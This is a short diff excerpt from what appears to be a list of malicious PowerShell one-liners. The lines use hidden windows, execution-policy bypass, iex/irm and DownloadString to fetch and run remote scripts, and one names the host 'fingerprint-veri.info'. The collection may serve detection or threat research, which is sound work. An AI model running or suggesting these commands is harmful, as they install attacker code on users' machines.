@@ -22,4 +22,3 @@ powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 
 powershell -nop -c \"$f=$env:TEMP+'\\pintk.ps1';curl.exe -sk -o $f '<URL>';powershell -ep bypass -File $f\"
 powershell -w h \"iex(irm \\'fingerprint-veri.info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit
 powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('<URL>'))\"
-sal a iex;irm <URL>|a
